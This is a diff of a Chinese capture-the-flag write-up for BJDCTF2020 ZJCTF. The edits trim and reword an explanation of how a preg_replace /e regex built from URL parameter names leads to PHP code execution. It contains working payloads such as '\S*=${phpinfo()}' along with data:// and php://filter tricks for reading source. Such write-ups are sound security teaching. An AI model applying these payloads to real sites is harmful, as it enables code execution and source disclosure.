@@ -2289,7 +2289,6 @@
 </span></code></pre></div>
 <p><strong>解码后得到 <code>next.php</code> 的源码。</strong></p>
 <h3 id="nextphp"><a class="toclink" href="bjdctf2020-zjctf/#nextphp">next.php 源码</a></h3>
-<p><img alt="next.php 源码" src="../assets/images/bjdctf-zjctf/02-next.png" /></p>
 <div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">&lt;?php</span>
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
@@ -2313,7 +2312,7 @@
 <p>先看 <code>foreach</code>：它把 GET 得到的<strong>名字传给 <code>$re</code></strong>，<strong>值传给 <code>$str</code></strong>。</p>
 <p>接着看这个最重要的正则表达式：<code>i</code> 是忽略大小写，<code>e</code> 是 <strong>eval</strong>，<code>(...)</code> 把整个匹配包成了<strong>捕获组 1</strong>，也就是 <code>strtolower</code> 里的 <code>\1</code>；在 PHP 单引号中的 <code>\\1</code> 等效于 <code>\1</code>。</p>
 <h3 id="re"><a class="toclink" href="bjdctf2020-zjctf/#re"><code>$re</code> 到底在干什么</a></h3>
-<p><strong>这是这题最反直觉的地方：<code>$re</code> 就是 URL 里参数的名字，它被直接拼进了正则。</strong></p>
+<p><strong><code>$re</code> 就是 URL 里参数的名字，它被直接拼进了正则。</strong></p>
 <div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">foreach($_GET as $re =&gt; $str)     // $re = 参数名,$str = 参数值</span>
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">      ↓</span>
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">'/(' . $re . ')/ei'              // 参数名成了正则主体</span>
@@ -2346,7 +2345,6 @@
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>而"匹配到的内容"由 $re 决定
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>→ 所以 $re 必须是一个"什么都匹配"的宽泛正则
 </span></code></pre></div>
-<p><strong>这就是为什么 payload 是从</strong>参数名<strong>下手的 —— 只改参数值没用。</strong></p>
 <p><strong>还有两个约束：</strong></p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>① $re 里不能有 /      → 会把正则模式提前截断
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>② $re 不能是 .        → PHP 会把参数名里的 . 换成 _
@@ -2365,7 +2363,7 @@
 <div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>/?.*=${phpinfo()}
 </span></code></pre></div>
 <p><strong>页面无回显。</strong></p>
-<p><strong>原因：PHP 解析 URL 参数时会把参数名里的 <code>.</code> 和空格统一换成 <code>_</code>，所以 <code>.*</code> 变成了 <code>_*</code>，正则变成 <code>/(_*)/ei</code> —— 匹配不到 <code>${phpinfo()}</code>，自然没反应。</strong></p>
+<p><strong>原因：PHP 解析 URL 参数时会把参数名里的 <code>.</code> 和空格统一换成 <code>_</code>，所以 <code>.*</code> 变成了 <code>_*</code>，正则变成 <code>/(_*)/ei</code> —— 匹配不到 <code>${phpinfo()}</code>，所以没反应。</strong></p>
 <p><strong>换 <code>\S</code>（匹配任意非空白字符）代替 <code>.</code>：</strong></p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>/?\S*=${phpinfo()}
 </span></code></pre></div>
@@ -2391,7 +2389,6 @@
 <div class="language-php highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x">eval('echo "A"');    // ❌ syntax error, unexpected end of file, expecting ';'</span>
 </span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="x">eval('echo "A";');   // ✅</span>
 </span></code></pre></div>
-<p><strong>而 <code>@</code> 把错误吞掉了，所以现象是「页面空白」而不是报错。</strong></p>
 <h3 id="_2"><a class="toclink" href="bjdctf2020-zjctf/#_2">完整链路</a></h3>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>① data:// 骗过 file_get_contents     text=data://text/plain,I have a dream
 </span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>② php://filter 读源码(不执行)        file=php://filter/read=convert.base64-encode/resource=next.php
